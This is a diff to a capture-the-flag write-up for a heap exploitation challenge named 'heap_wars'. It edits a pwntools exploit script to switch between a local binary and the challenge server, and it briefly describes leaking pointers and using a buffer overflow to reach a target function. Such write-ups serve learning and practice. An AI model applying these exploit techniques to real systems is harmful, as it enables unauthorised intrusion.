@@ -101,18 +101,19 @@ Finally what we have to do is calculate the distance between `rax_2` and `rax_3`
 `theForce()` function using the buffer overflow. Since the pointers are leaked all we have to do is 
 `int_function_address - int_data_address` to get the offset.
 
-```python
+```python                                                                      
 from pwn import *
 
-filename = "./challenge/challenge/heap_wars"
+filename = "heap_wars"
 
 elf = ELF(filename)
 #context.log_level = 'debug'
 context.binary = elf
 
-# p = process(filename)
-
-p = remote('94.72.112.248', 1337)
+if args.REMOTE :
+    p = remote('94.72.112.248', 1337)
+else:
+    p = process(filename)
 
 p.recvuntil(b'Enter your choice:')
 p.sendline(b'2')
@@ -142,7 +143,7 @@ p.interactive()
 Finally we run our exploit and get the flag.
 
 ```bash
-python exploit.py
+python exploit.py REMOTE
 ...
 [+] Opening connection to 94.72.112.248 on port 1337: Done
 [*] Switching to interactive mode
